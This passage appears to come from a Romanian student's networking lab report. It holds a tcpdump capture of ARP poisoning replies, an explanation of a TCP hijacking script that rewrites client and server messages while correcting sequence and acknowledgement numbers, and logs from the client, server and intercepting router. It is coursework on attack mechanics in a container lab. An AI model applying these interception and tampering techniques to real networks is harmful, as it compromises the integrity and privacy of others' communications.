	0x0010:  4500 0059 fc12 4000 2e06 9597 c1e2 3309  E..Y..@.......3.
	0x0020:  c607 0002 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e cc1b 0000 0101 080a 93aa 0073  ...>...........s
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
IP (tos 0x0, ttl 47, id 64531, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [P.], cksum 0xcb3a (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477392211 ecr 3077947495], length 37
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0059 fc13 4000 2f06 9495 c1e2 3309  E..Y..@./.....3.
	0x0020:  c607 0003 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e cb3a 0000 0101 080a 93aa 0153  ...>.:.........S
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
IP (tos 0x0, ttl 46, id 64531, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [P.], cksum 0xcb3b (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477392211 ecr 3077947495], length 37
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0059 fc13 4000 2e06 9596 c1e2 3309  E..Y..@.......3.
	0x0020:  c607 0002 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e cb3b 0000 0101 080a 93aa 0153  ...>.;.........S
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
ARP, Ethernet (len 6), IPv4 (len 4), Reply 198.7.0.2 is-at 02:42:c6:07:00:03, length 28
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0806  .......B........
	0x0010:  0001 0800 0604 0002 0242 c607 0003 c607  .........B......
	0x0020:  0002 0242 c607 0001 c607 0001            ...B........
ARP, Ethernet (len 6), IPv4 (len 4), Reply 198.7.0.1 is-at 02:42:c6:07:00:03, length 28
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0806  .......B........
	0x0010:  0001 0800 0604 0002 0242 c607 0003 c607  .........B......
	0x0020:  0001 0242 c607 0002 c607 0002            ...B........
IP (tos 0x0, ttl 47, id 64532, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [P.], cksum 0xc97a (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477392659 ecr 3077947495], length 37
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0059 fc14 4000 2f06 9494 c1e2 3309  E..Y..@./.....3.
	0x0020:  c607 0003 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e c97a 0000 0101 080a 93aa 0313  ...>.z..........
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
IP (tos 0x0, ttl 46, id 64532, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [P.], cksum 0xc97b (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477392659 ecr 3077947495], length 37
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0059 fc14 4000 2e06 9595 c1e2 3309  E..Y..@.......3.
	0x0020:  c607 0002 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e c97b 0000 0101 080a 93aa 0313  ...>.{..........
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
ARP, Ethernet (len 6), IPv4 (len 4), Reply 198.7.0.2 is-at 02:42:c6:07:00:03, length 28
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0806  .......B........
	0x0010:  0001 0800 0604 0002 0242 c607 0003 c607  .........B......
	0x0020:  0002 0242 c607 0001 c607 0001            ...B........
ARP, Ethernet (len 6), IPv4 (len 4), Reply 198.7.0.1 is-at 02:42:c6:07:00:03, length 28
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0806  .......B........
	0x0010:  0001 0800 0604 0002 0242 c607 0003 c607  .........B......
	0x0020:  0001 0242 c607 0002 c607 0002            ...B........
^C
73 packets captured
74 packets received by filter
1 packet dropped by kernel

```

## 2. TCP Hijacking (5%)

Scrieți mesajele primite de server, client și printați acțiunile pe care le face middle.

### Observatii:

1. Daca se modifica mesajul astfel incat lungimea noua a mesajului este mai mare decat lungimea originala atunci va aparea o eroare. 

    Din ce am observat analizand traficul pe retea si logurile din program, nu se primeste o confirmare pentru mesajul trimis. Exemplu: Daca clientul trimite mesajul `mesaj_1` spre server si la interceptie se modifica in `mesaj_1_hacked` , serverul va primi mesajul `mesaj_1_hacked` insa confirmarea pentru acesta nu va ajunge la client, care va retransmite iar mesajul `mesaj_1`. 
    
    Acelasi comportament este si in sens invers. Conform logurilor din program si a traficului analizat valorile pentru `seq_nr` si `ack_nr` sunt corecte insa pentru moment este ceva ce imi scapa din vedere. 
    
2. Daca se modifica mesajul astfel incat lungimea noua a mesajului este egala cu lungimea originala totul functioneaza corect.

3. Daca se modifica mesajul astfel incat lungimea noua a mesajului este mai mica decat lungimea originala totul functioneaza corect.

4. Daca se face o combinatie de tipul celor de la pasii `2` si `3` totul va functiona corect atat timp cat initial se transmit mesaje de tipul pasului `2` si dupa mesaje de tipul pasului `3`. 

    Daca initial se transmit mesaje de tipul pasului `3` cand se va incerca transmiterea unui mesaj de tipul pasului `2` va aparea o eroare (aceeasi cauza ca la mesajele de la pasul `1`). Deci se pot trimite in mod corect doar mesaje de tip `2`, urmate de mesaje de tip `3`. Intercalarea acestora genereaza eroarea mai sus amintita.

5. Pasul `4` nu apare mereu ci doar la anumite rulari. De exemplu in logurile de mai jos aceasta problema nu a aparut astfel ca modificarile au putut fi intercalate.

6. Avand in vedere ca nu sunt functionale toate tipurile de modificari si toate tipurile de combinatii de modificari nu am legat `"atacul"` si de `punctul 1`. Astfel `nu am rulat de pe containerul middle` aplicand otravirea de tip `ARP` inainte, ci `am rulat doar de pe containerul router` fara nici un tip de otravire. `Am incercat doar sa interceptez mesajele si sa le modific`. 


## Explicatii sumare a modului de functionare (am adaugat comentarii mai amanuntite in cod in sursa `tcp_hijacking.py` )

1. Clientul trimite un mesaj serverului (de ex: `mesaj_1`)

2. Daca scriptul tcp_hijacking.py nu ruleaza pe router atunci mesajul ajuns la server nu este alterat.

3. Daca scriptul tcp_hijacking.py ruleaza pe router atunci pachetul este interceptat si modificat astfel:

        a. se genereaza un numar random intre 1,500

        b. daca numarul este intre 1 si 200 se modifica mesajul astfel incat lungimea sa ramana aceeasi. De exemplu pentru 'mesajul_1' ar fi urmatoarea modificare ==> 'hacked__1'

        c. daca numarul este intre 200 si 400 se modifica mesajul astfel incat lungimea sa fie mai mica. De exemplu pentru 'mesaj_1' ar fi urmatoarea modificare ==> 'mH_1'

        d. daca numarul este intre 400 si 500 mesajul nu se modifica
    
4. Se efectueaza calculele necesare astfel incat sa se salveze `seq_nr si ack_nr` ( mai multe detalii in cod pe baza comentariilor)
   
5. Se trimite mesajul modificat la pasul `3` catre server

6. Serverul primeste mesajul si trimite inapoi un nou mesaj compus din mesajul primit 

7. Se opereaza aceeasi pasi ca la `3 si 4` pe mesajul de la server

8. Clientul primeste mesajul de la server

9. Se reiau pasii `1 - 8`


## Explicatii pentru loguri

1. Mesajele `'mesajul_1' .... 'mesajul_4'` nu au fost modificate deoarece scriptul tcp_hijacking.py nu rula pe router

2. Se poate observa ca atunci cand scriptul a inceput sa ruleze a captat mesajul `mesajul_5`

3. Discutie incepand cu `mesajul_5`

    `Informatii despre pachetul interceptat:`

        [LINE:77]# INFO     [2020-06-29 16:11:45,297]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
        

    `Care era mesajul inainte de modificare:`
        
        [LINE:80]# INFO     [2020-06-29 16:11:45,298]  [Before RAW Load]:  b'mesajul_5'


    `Cu aceste date a ajuns pachetul inainte sa fie modificat. CLIENT -- BEFORE specifica ca este un mesaj venit de la client`.

        [LINE:100]# INFO     [2020-06-29 16:11:45,299]  [CLIENT -- BEFORE] seq_nr 3748974653:3748974662 , ack = 1963746443


    `Acesta este ack_nr pe care serverul il asteapta. Fiind primul pachet interceptat acest numar este None, deoarece nu ar trebui intervenit la ack_nr existent in pachet.`

        [LINE:101]# INFO     [2020-06-29 16:11:45,299]  server_ack_nr_expected = None

    
    `Cu aceste date a plecat pachetul spre server. Intervalul de secvente s-a modificat deoarece s-a modificat si lungimea mesajului.`
  
        [LINE:174]# INFO     [2020-06-29 16:11:45,300]  [CLIENT -- AFTER] seq_nr 3748974653:3748974658 , ack = 1963746443

        
    `Aceasta este secventa de la care va trebui sa porneasca urmatorul mesaj catre server. Fiecare transmisie trebuie sa aiba un interval de secvente unic (asa am considerat). De asemenea intervalul de secvente trebuie sa fie continuu ( de exemplu daca serverul primeste secventa 123:145 , urmatorul mesaj va trebui sa aiba 145:valoare ,  deci trebuie sa fie o secventa continua). Acelasi mod se aplica si la client.`

        [LINE:175]# INFO     [2020-06-29 16:11:45,301]  server_start_seq_nr_expected = 3748974658

    
    `Mesajul dupa modificare. In acest caz s-a modificat astfel incat lungimea a devenit mai mica.`

        [LINE:302]# INFO     [2020-06-29 16:11:45,301]  [After RAW Load]:  b"mH_5'"


    
    `Mesajul care vine de la server spre client (ca raspuns la mesajul anterior trimis de client). S-a modificat in acelasi mod ca mesajul anterior, astfel incat lungimea noului mesaj este mai mica decat lungimea mesajului original. Deci s-a modificat si aici intervalul de secvente precum si ack_nr asteptat de client care a preluat valoarea de la client_ack_nr_expected (valoarea pe care o asteapta clientul pentru mesajul 'mesajul_5' -- mesajul nemodificat).`
    

        [LINE:77]# INFO     [2020-06-29 16:11:45,308]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
   
        [LINE:80]# INFO     [2020-06-29 16:11:45,308]  [Before RAW Load]:  b"Server a primit mesajul: mH_5'"

        [LINE:185]# INFO     [2020-06-29 16:11:45,309]  [SERVER -- BEFORE] seq_nr 1963746443:1963746473 , ack = 3748974658

        [LINE:186]# INFO     [2020-06-29 16:11:45,309]  client_ack_nr_expected = 3748974662
  
        [LINE:261]# INFO     [2020-06-29 16:11:45,310]  [SERVER -- AFTER] seq_nr 1963746443:1963746469 , ack = 3748974662

        [LINE:262]# INFO     [2020-06-29 16:11:45,310]  client_start_seq_nr_expected = 1963746469

        [LINE:302]# INFO     [2020-06-29 16:11:45,311]  [After RAW Load]:  b"Server HACK mesajul: mH_5'"



    `Clientul a primit mesajul anterior si trimite o confirmare catre server care trebuie modificata cu ack_nr corespunzator. Mesajul vine cu ack_nr = 1963746469 insa dupa ce va pleca pachetul va avea ack_nr = 1963746473 (ack_nr pe care serverul il asteapta) .`

        [LINE:77]# INFO     [2020-06-29 16:11:45,314]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
 
        [LINE:269]# INFO     [2020-06-29 16:11:45,315]  Alt tip de pachet.  Flag = A
        [LINE:273]# INFO     [2020-06-29 16:11:45,315]  Confirmare ack = 1963746469
        [LINE:281]# INFO     [2020-06-29 16:11:45,315]  CLIENT flag A ==> ack = 1963746473


    `Se transmite mesajul 'mesajul_6' de la client la server. De data aceasta mesajul se modifica dar lungimea ramane aceeasi. Totusi si acum se modifica intervalul de secvente.`

        [LINE:77]# INFO     [2020-06-29 16:11:50,322]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw

        [LINE:80]# INFO     [2020-06-29 16:11:50,324]  [Before RAW Load]:  b'mesajul_6'

        [LINE:100]# INFO     [2020-06-29 16:11:50,325]  [CLIENT -- BEFORE] seq_nr 3748974662:3748974671 , ack = 1963746469

        [LINE:101]# INFO     [2020-06-29 16:11:50,326]  server_ack_nr_expected = 1963746473

        
        
    `Intervalul de secvente este modificat pentru ca mesajul anterior primit de server avusese secventa 3748974653:3748974658. Astfel ca acum se va continua de la 3748974658. `
        
        [LINE:174]# INFO     [2020-06-29 16:11:50,328]  [CLIENT -- AFTER] seq_nr 3748974658:3748974667 , ack = 1963746473
        

    `Secventa de start viitoare este ajustata corespunzator chiar daca lungimea nu s-a modificat`

        [LINE:175]# INFO     [2020-06-29 16:11:50,328]  server_start_seq_nr_expected = 3748974667
        

    `Mesajul modificat.`

        [LINE:302]# INFO     [2020-06-29 16:11:50,329]  [After RAW Load]:  b"hacked_6'"


    `Mesajul care vine de la server ca raspuns la mesajul primit anterior. In acest caz va fi modificat astfel incat lungimea mesajului va fi mai mica decat cea a mesajului original. De asemena si secventele se vor ajusta.`

        [LINE:77]# INFO     [2020-06-29 16:11:50,335]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw

        [LINE:80]# INFO     [2020-06-29 16:11:50,336]  [Before RAW Load]:  b"Server a primit mesajul: hacked_6'"

        [LINE:185]# INFO     [2020-06-29 16:11:50,337]  [SERVER -- BEFORE] seq_nr 1963746473:1963746507 , ack = 3748974667

        [LINE:186]# INFO     [2020-06-29 16:11:50,337]  client_ack_nr_expected = 3748974671

        [LINE:261]# INFO     [2020-06-29 16:11:50,338]  [SERVER -- AFTER] seq_nr 1963746469:1963746499 , ack = 3748974671

        [LINE:262]# INFO     [2020-06-29 16:11:50,338]  client_start_seq_nr_expected = 1963746499

        [LINE:302]# INFO     [2020-06-29 16:11:50,339]  [After RAW Load]:  b"Server HACK mesajul: hacked_6'"


    `Se trimite confirmarea pentru mesajul anterior primit de la server si se ajusteaza ack_nr astfel incat sa fie cel potrivit`

        [LINE:77]# INFO     [2020-06-29 16:11:50,343]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A

        [LINE:269]# INFO     [2020-06-29 16:11:50,344]  Alt tip de pachet.  Flag = A
        [LINE:273]# INFO     [2020-06-29 16:11:50,345]  Confirmare ack = 1963746499
        [LINE:281]# INFO     [2020-06-29 16:11:50,345]  CLIENT flag A ==> ack = 1963746507


4. Se repeta pasii in acelasi mod pentru logurile ulterioare. 


   



## Loguri server

```
root@6461ed3b3f2a:/elocal/tema5-original/src# python3 tcp_server.py 
[LINE:14]# INFO     [2020-06-29 16:11:19,227]  Serverul a pornit pe 0.0.0.0 si portul 10040
[LINE:18]# INFO     [2020-06-29 16:11:19,227]  Asteptam conexiuni...
[LINE:20]# INFO     [2020-06-29 16:11:20,261]  Handshake cu ('198.7.0.1', 56326)
[LINE:28]# INFO     [2020-06-29 16:11:25,264]  Content primit: "b'mesajul_1'"
[LINE:30]# INFO     [2020-06-29 16:11:25,264]  Content trimis: Server a primit mesajul: b'mesajul_1'
[LINE:28]# INFO     [2020-06-29 16:11:30,270]  Content primit: "b'mesajul_2'"
[LINE:30]# INFO     [2020-06-29 16:11:30,271]  Content trimis: Server a primit mesajul: b'mesajul_2'
[LINE:28]# INFO     [2020-06-29 16:11:35,278]  Content primit: "b'mesajul_3'"
[LINE:30]# INFO     [2020-06-29 16:11:35,279]  Content trimis: Server a primit mesajul: b'mesajul_3'
[LINE:28]# INFO     [2020-06-29 16:11:40,285]  Content primit: "b'mesajul_4'"
[LINE:30]# INFO     [2020-06-29 16:11:40,286]  Content trimis: Server a primit mesajul: b'mesajul_4'
[LINE:28]# INFO     [2020-06-29 16:11:45,305]  Content primit: "b"mH_5'""
[LINE:30]# INFO     [2020-06-29 16:11:45,305]  Content trimis: Server a primit mesajul: b"mH_5'"
[LINE:28]# INFO     [2020-06-29 16:11:50,332]  Content primit: "b"hacked_6'""
[LINE:30]# INFO     [2020-06-29 16:11:50,333]  Content trimis: Server a primit mesajul: b"hacked_6'"
[LINE:28]# INFO     [2020-06-29 16:11:55,354]  Content primit: "b"hacked_7'""
[LINE:30]# INFO     [2020-06-29 16:11:55,355]  Content trimis: Server a primit mesajul: b"hacked_7'"
[LINE:28]# INFO     [2020-06-29 16:12:00,387]  Content primit: "b"mH_8'""
[LINE:30]# INFO     [2020-06-29 16:12:00,387]  Content trimis: Server a primit mesajul: b"mH_8'"
[LINE:28]# INFO     [2020-06-29 16:12:05,411]  Content primit: "b"hacked_9'""
[LINE:30]# INFO     [2020-06-29 16:12:05,412]  Content trimis: Server a primit mesajul: b"hacked_9'"
[LINE:28]# INFO     [2020-06-29 16:12:10,439]  Content primit: "b"hacked_10'""
[LINE:30]# INFO     [2020-06-29 16:12:10,439]  Content trimis: Server a primit mesajul: b"hacked_10'"
[LINE:28]# INFO     [2020-06-29 16:12:15,457]  Content primit: "b"hacked_11'""
[LINE:30]# INFO     [2020-06-29 16:12:15,458]  Content trimis: Server a primit mesajul: b"hacked_11'"
[LINE:28]# INFO     [2020-06-29 16:12:20,481]  Content primit: "b"hacked_12'""
[LINE:30]# INFO     [2020-06-29 16:12:20,481]  Content trimis: Server a primit mesajul: b"hacked_12'"
[LINE:28]# INFO     [2020-06-29 16:12:25,499]  Content primit: "b"hacked_13'""
[LINE:30]# INFO     [2020-06-29 16:12:25,500]  Content trimis: Server a primit mesajul: b"hacked_13'"
[LINE:28]# INFO     [2020-06-29 16:12:30,524]  Content primit: "b"mH_14'""
[LINE:30]# INFO     [2020-06-29 16:12:30,524]  Content trimis: Server a primit mesajul: b"mH_14'"
[LINE:28]# INFO     [2020-06-29 16:12:35,548]  Content primit: "b'mesajul_15'"
[LINE:30]# INFO     [2020-06-29 16:12:35,549]  Content trimis: Server a primit mesajul: b'mesajul_15'
[LINE:28]# INFO     [2020-06-29 16:12:40,572]  Content primit: "b"hacked_16'""
[LINE:30]# INFO     [2020-06-29 16:12:40,573]  Content trimis: Server a primit mesajul: b"hacked_16'"
[LINE:28]# INFO     [2020-06-29 16:12:45,593]  Content primit: "b'mesajul_17'"
[LINE:30]# INFO     [2020-06-29 16:12:45,593]  Content trimis: Server a primit mesajul: b'mesajul_17'
[LINE:28]# INFO     [2020-06-29 16:12:50,616]  Content primit: "b"hacked_18'""
[LINE:30]# INFO     [2020-06-29 16:12:50,616]  Content trimis: Server a primit mesajul: b"hacked_18'"
[LINE:28]# INFO     [2020-06-29 16:12:55,640]  Content primit: "b'mesajul_19'"
[LINE:30]# INFO     [2020-06-29 16:12:55,641]  Content trimis: Server a primit mesajul: b'mesajul_19'
[LINE:28]# INFO     [2020-06-29 16:13:00,666]  Content primit: "b"mH_20'""
[LINE:30]# INFO     [2020-06-29 16:13:00,666]  Content trimis: Server a primit mesajul: b"mH_20'"
[LINE:28]# INFO     [2020-06-29 16:13:05,690]  Content primit: "b'mesajul_21'"
[LINE:30]# INFO     [2020-06-29 16:13:05,690]  Content trimis: Server a primit mesajul: b'mesajul_21'
[LINE:28]# INFO     [2020-06-29 16:13:10,718]  Content primit: "b"hacked_22'""
[LINE:30]# INFO     [2020-06-29 16:13:10,718]  Content trimis: Server a primit mesajul: b"hacked_22'"

```

## Loguri client

```
root@5f94fe59f1ed:/elocal/tema5-original/src# python3 tcp_client.py 
[LINE:16]# INFO     [2020-06-29 16:11:20,260]  Handshake cu ('198.7.0.2', 10040)
[LINE:25]# INFO     [2020-06-29 16:11:25,264]  Mesaj trimis: "mesajul_1"
[LINE:27]# INFO     [2020-06-29 16:11:25,264]  Content primit: "b'Server a primit mesajul: mesajul_1'"
[LINE:25]# INFO     [2020-06-29 16:11:30,271]  Mesaj trimis: "mesajul_2"
[LINE:27]# INFO     [2020-06-29 16:11:30,272]  Content primit: "b'Server a primit mesajul: mesajul_2'"
[LINE:25]# INFO     [2020-06-29 16:11:35,278]  Mesaj trimis: "mesajul_3"
[LINE:27]# INFO     [2020-06-29 16:11:35,279]  Content primit: "b'Server a primit mesajul: mesajul_3'"
[LINE:25]# INFO     [2020-06-29 16:11:40,285]  Mesaj trimis: "mesajul_4"
[LINE:27]# INFO     [2020-06-29 16:11:40,287]  Content primit: "b'Server a primit mesajul: mesajul_4'"
[LINE:25]# INFO     [2020-06-29 16:11:45,293]  Mesaj trimis: "mesajul_5"
[LINE:27]# INFO     [2020-06-29 16:11:45,313]  Content primit: "b"Server HACK mesajul: mH_5'""
[LINE:25]# INFO     [2020-06-29 16:11:50,319]  Mesaj trimis: "mesajul_6"
[LINE:27]# INFO     [2020-06-29 16:11:50,341]  Content primit: "b"Server HACK mesajul: hacked_6'""
[LINE:25]# INFO     [2020-06-29 16:11:55,347]  Mesaj trimis: "mesajul_7"
[LINE:27]# INFO     [2020-06-29 16:11:55,372]  Content primit: "b"Server a primit mesajul: hacked_7'""
[LINE:25]# INFO     [2020-06-29 16:12:00,379]  Mesaj trimis: "mesajul_8"
[LINE:27]# INFO     [2020-06-29 16:12:00,397]  Content primit: "b"Server HACK mesajul: mH_8'""
[LINE:25]# INFO     [2020-06-29 16:12:05,404]  Mesaj trimis: "mesajul_9"
[LINE:27]# INFO     [2020-06-29 16:12:05,426]  Content primit: "b"Server a primit mesajul: hacked_9'""
[LINE:25]# INFO     [2020-06-29 16:12:10,433]  Mesaj trimis: "mesajul_10"
[LINE:27]# INFO     [2020-06-29 16:12:10,444]  Content primit: "b"Server a hacked mesajul: hacked_10'""
[LINE:25]# INFO     [2020-06-29 16:12:15,449]  Mesaj trimis: "mesajul_11"
[LINE:27]# INFO     [2020-06-29 16:12:15,467]  Content primit: "b"Server a hacked mesajul: hacked_11'""
[LINE:25]# INFO     [2020-06-29 16:12:20,473]  Mesaj trimis: "mesajul_12"
[LINE:27]# INFO     [2020-06-29 16:12:20,490]  Content primit: "b"Server HACK mesajul: hacked_12'""
[LINE:25]# INFO     [2020-06-29 16:12:25,492]  Mesaj trimis: "mesajul_13"
[LINE:27]# INFO     [2020-06-29 16:12:25,509]  Content primit: "b"Server a hacked mesajul: hacked_13'""
[LINE:25]# INFO     [2020-06-29 16:12:30,516]  Mesaj trimis: "mesajul_14"
[LINE:27]# INFO     [2020-06-29 16:12:30,533]  Content primit: "b"Server HACK mesajul: mH_14'""
[LINE:25]# INFO     [2020-06-29 16:12:35,540]  Mesaj trimis: "mesajul_15"
[LINE:27]# INFO     [2020-06-29 16:12:35,558]  Content primit: "b'Server a primit mesajul: mesajul_15'"
[LINE:25]# INFO     [2020-06-29 16:12:40,564]  Mesaj trimis: "mesajul_16"
[LINE:27]# INFO     [2020-06-29 16:12:40,582]  Content primit: "b"Server a primit mesajul: hacked_16'""
[LINE:25]# INFO     [2020-06-29 16:12:45,584]  Mesaj trimis: "mesajul_17"
[LINE:27]# INFO     [2020-06-29 16:12:45,601]  Content primit: "b'Server a primit mesajul: mesajul_17'"
[LINE:25]# INFO     [2020-06-29 16:12:50,608]  Mesaj trimis: "mesajul_18"
[LINE:27]# INFO     [2020-06-29 16:12:50,624]  Content primit: "b"Server a hacked mesajul: hacked_18'""
[LINE:25]# INFO     [2020-06-29 16:12:55,631]  Mesaj trimis: "mesajul_19"
[LINE:27]# INFO     [2020-06-29 16:12:55,651]  Content primit: "b'Server a hacked mesajul: mesajul_19'"
[LINE:25]# INFO     [2020-06-29 16:13:00,658]  Mesaj trimis: "mesajul_20"
[LINE:27]# INFO     [2020-06-29 16:13:00,675]  Content primit: "b"Server a primit mesajul: mH_20'""
[LINE:25]# INFO     [2020-06-29 16:13:05,682]  Mesaj trimis: "mesajul_21"
[LINE:27]# INFO     [2020-06-29 16:13:05,702]  Content primit: "b'Server HACK mesajul: mesajul_21'"
[LINE:25]# INFO     [2020-06-29 16:13:10,709]  Mesaj trimis: "mesajul_22"
[LINE:27]# INFO     [2020-06-29 16:13:10,727]  Content primit: "b"Server HACK mesajul: hacked_22'""

```

## Loguri "middle" (routerul in cazul acesta)

```
root@4c9ecff6bfe1:/elocal/tema5-original/src# python3 tcp_hijacking.py
[LINE:76]# INFO     [2020-06-29 16:11:45,296]  
[LINE:77]# INFO     [2020-06-29 16:11:45,297]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:11:45,297]  
[LINE:80]# INFO     [2020-06-29 16:11:45,298]  [Before RAW Load]:  b'mesajul_5'
[LINE:99]# INFO     [2020-06-29 16:11:45,298]  
[LINE:100]# INFO     [2020-06-29 16:11:45,299]  [CLIENT -- BEFORE] seq_nr 3748974653:3748974662 , ack = 1963746443
[LINE:101]# INFO     [2020-06-29 16:11:45,299]  server_ack_nr_expected = None
[LINE:102]# INFO     [2020-06-29 16:11:45,299]  
[LINE:174]# INFO     [2020-06-29 16:11:45,300]  [CLIENT -- AFTER] seq_nr 3748974653:3748974658 , ack = 1963746443
[LINE:175]# INFO     [2020-06-29 16:11:45,301]  server_start_seq_nr_expected = 3748974658
[LINE:302]# INFO     [2020-06-29 16:11:45,301]  [After RAW Load]:  b"mH_5'"
[LINE:303]# INFO     [2020-06-29 16:11:45,302]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:11:45,307]  
[LINE:77]# INFO     [2020-06-29 16:11:45,308]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:11:45,308]  
[LINE:80]# INFO     [2020-06-29 16:11:45,308]  [Before RAW Load]:  b"Server a primit mesajul: mH_5'"
[LINE:184]# INFO     [2020-06-29 16:11:45,309]  
[LINE:185]# INFO     [2020-06-29 16:11:45,309]  [SERVER -- BEFORE] seq_nr 1963746443:1963746473 , ack = 3748974658
[LINE:186]# INFO     [2020-06-29 16:11:45,309]  client_ack_nr_expected = 3748974662
[LINE:187]# INFO     [2020-06-29 16:11:45,310]  
[LINE:260]# INFO     [2020-06-29 16:11:45,310]  
[LINE:261]# INFO     [2020-06-29 16:11:45,310]  [SERVER -- AFTER] seq_nr 1963746443:1963746469 , ack = 3748974662
[LINE:262]# INFO     [2020-06-29 16:11:45,310]  client_start_seq_nr_expected = 1963746469
[LINE:263]# INFO     [2020-06-29 16:11:45,310]  
[LINE:302]# INFO     [2020-06-29 16:11:45,311]  [After RAW Load]:  b"Server HACK mesajul: mH_5'"
[LINE:303]# INFO     [2020-06-29 16:11:45,311]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:11:45,314]  
[LINE:77]# INFO     [2020-06-29 16:11:45,314]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:11:45,314]  
[LINE:268]# INFO     [2020-06-29 16:11:45,315]  
[LINE:269]# INFO     [2020-06-29 16:11:45,315]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:11:45,315]  Confirmare ack = 1963746469
[LINE:281]# INFO     [2020-06-29 16:11:45,315]  CLIENT flag A ==> ack = 1963746473
[LINE:303]# INFO     [2020-06-29 16:11:45,316]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:11:50,321]  
[LINE:77]# INFO     [2020-06-29 16:11:50,322]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:11:50,323]  
[LINE:80]# INFO     [2020-06-29 16:11:50,324]  [Before RAW Load]:  b'mesajul_6'
[LINE:99]# INFO     [2020-06-29 16:11:50,325]  
[LINE:100]# INFO     [2020-06-29 16:11:50,325]  [CLIENT -- BEFORE] seq_nr 3748974662:3748974671 , ack = 1963746469
[LINE:101]# INFO     [2020-06-29 16:11:50,326]  server_ack_nr_expected = 1963746473
[LINE:102]# INFO     [2020-06-29 16:11:50,326]  
[LINE:174]# INFO     [2020-06-29 16:11:50,328]  [CLIENT -- AFTER] seq_nr 3748974658:3748974667 , ack = 1963746473
[LINE:175]# INFO     [2020-06-29 16:11:50,328]  server_start_seq_nr_expected = 3748974667
[LINE:302]# INFO     [2020-06-29 16:11:50,329]  [After RAW Load]:  b"hacked_6'"
[LINE:303]# INFO     [2020-06-29 16:11:50,329]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:11:50,334]  
[LINE:77]# INFO     [2020-06-29 16:11:50,335]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:11:50,336]  
[LINE:80]# INFO     [2020-06-29 16:11:50,336]  [Before RAW Load]:  b"Server a primit mesajul: hacked_6'"
[LINE:184]# INFO     [2020-06-29 16:11:50,336]  
[LINE:185]# INFO     [2020-06-29 16:11:50,337]  [SERVER -- BEFORE] seq_nr 1963746473:1963746507 , ack = 3748974667
[LINE:186]# INFO     [2020-06-29 16:11:50,337]  client_ack_nr_expected = 3748974671
[LINE:187]# INFO     [2020-06-29 16:11:50,337]  
[LINE:260]# INFO     [2020-06-29 16:11:50,337]  
